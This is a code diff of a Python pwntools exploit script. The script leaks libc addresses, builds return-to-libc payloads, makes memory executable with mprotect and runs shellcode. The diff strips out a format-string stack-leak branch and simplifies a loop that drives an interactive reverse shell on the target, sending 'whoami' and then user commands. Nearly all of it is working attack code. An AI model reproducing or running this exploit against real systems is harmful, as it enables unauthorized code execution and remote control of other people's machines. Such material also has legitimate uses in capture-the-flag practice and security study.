@@ -48,7 +48,7 @@ def skip_lines(proc, lines):
     for _ in range(lines):
         proc.recvline(timeout=0.05)
 
-def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
+def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
     # Leak randomised libc puts addr
     putsAddr = leak_via_puts(conn, port, gotPuts)
 
@@ -56,77 +56,8 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
     libc_address = putsAddr - putsOffset
     log.success(f'LIBC base: {hex(libc_address)}')
     
-    # If the user selects to write the shellcode to the stack then leak stack locations via creating a format string vulnerability
-    if writeToStack:
-
-        # Create different payloads if 64bit specified
-        ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary or libc and prepending it
-        if arch == 8:
-            printfBytes = p64(printfOff+libc_address)
-            percPBytes = p64(percpOff+libc_address)
-        else:
-            printfBytes = p32(printfOff+libc_address)
-            percPBytes = p32(percpOff+libc_address)
-        
-        # Create and send printf('%x') buffer overflow payload
-        payload = flat(
-            b'B' * BUFF_SIZE, # Padding so the next bytes will overwrite the EIP
-            printfBytes,     # Overflowed function will execute printf() on return
-            MAIN_ADDR,        # printf will execute main() on return to facilitate subsequent buffer overflows
-            percPBytes,      # printf's first pararmter 
-                             # Which is libc's '%x' offset making the function call printf('%x') 
-                             # Which is a format string vulnerability leaking the next value on the stack in hex
-        )
-        log.info("Leaking stack via printf(%x)")
-        # Execute 'leakNo' number of stack leaks and find stack values
-        stackVal = False
-        try:
-            for i in range(leakNo):
-                # Send buffer overflow and leak value
-                proc.sendline(payload)
-                # Skip lines to get leak
-                for i in range(OUTPUT_LINES_BEFORE-1):
-                    proc.recvline(timeout = 0.05)
-                
-                # Store leaked value
-                leakLine= proc.recvline(timeout = 0.05)
-                #print(leakLine)
-                leakedVal = leakLine.split(leakDelim)[0]
-
-                # Return error if leaked value doesn't match format
-                if len(leakedVal)==0:
-                    return 100
-                try:
-                    if leakedVal!=b"(nil)":
-                        int(leakedVal,16)
-                except:
-                    return 300
-                
-                ## Find a stack address by checking for an address located in the .text section 
-                ## then the stack address should be the next leaked value
-
-                # Ouput and save stack value if .text address found
-                #print(b"Leaked Value: " + leakedVal)
-                if stackVal:
-                    log.success("Stack Value = "+(leakedVal).decode('utf-8'))
-                    stackAddr = leakedVal
-                    break
-
-                # Check if address in .text (specifically matches the first 4 bytes of the MAIN_ADDRess)
-                if (leakedVal[:4]).decode("utf-8")==hex(MAIN_ADDR)[2:6]:
-                    stackVal = True
-        
-        # Return error if program doesn't leak value
-        except EOFError:
-            return 300
-
-        # Make sure shellcode isn't overwriting important values on the stack
-        codeAddr = int(leakedVal,16)+132+BUFF_SIZE+len(shellcode)
     
-    # If the user doesn't want the shellcode on the stack, overwrite the start of libc with the shellcode,
-    # this can be any memory address but the start of libc should be fine
-    else:
-        codeAddr = libc_address
+    codeAddr = libc_address
     
     # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
     # This allows the program to write to and execute the address found above
@@ -177,30 +108,21 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
     #print(output)
     
     # Check if reverse shell was spawned then handle user input and output for the process
-    return handleReverseShell()
+    return handle_reverse_shell()
 
-def handleReverseShell():
-    # Check if shell was sucessfully executed
-    noEOF = True
+def handle_reverse_shell():
+    """
+    Handles the reverse shell interaction with the process.
+    """
     try:
-        proc.sendline(b"whoami"+b" 2>&1")
-        print(proc.recv(timeout = 0.1).decode('utf-8'))
+        proc.sendline(b"whoami")
+        print(proc.recv(timeout=0.1).decode('utf-8'))
+        while True:
+            command = input("$ ")
+            proc.sendline(command.encode('utf-8'))
+            print(proc.recv(timeout=0.2).decode('utf-8'))
     except EOFError:
-        noEOF = False
-
-    # Create terminal input with option to automatically redirect stderr to stdout
-    commandModifier = b""
-    if redirectStdErr:
-        commandModifier = b" 2>&1"
-    while noEOF:
-        command = input("$ ")
-        try:
-            proc.sendline((command).encode('utf-8')+commandModifier)
-            print(proc.recv(timeout = 0.2).decode('utf-8'))
-        except EOFError:
-            return 200
-    # If EOF found return 300
-    return 300
+        return 300
 
 
 def find_potential_libcs(puts_addr):
@@ -237,16 +159,14 @@ def getLibcSymbolOffsets(libcJson):
 
 
 def main():
-        
         putsAddr = leak_via_puts(conn,port,gotPuts)
         responseJson = find_potential_libcs(putsAddr)
 
-        percXOff = 0
         for item in responseJson:
         # Get the symbol offsets for the specific libc version
             putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
             
-            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16),percXOff)
+            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16))
 
 
 if __name__ == "__main__":
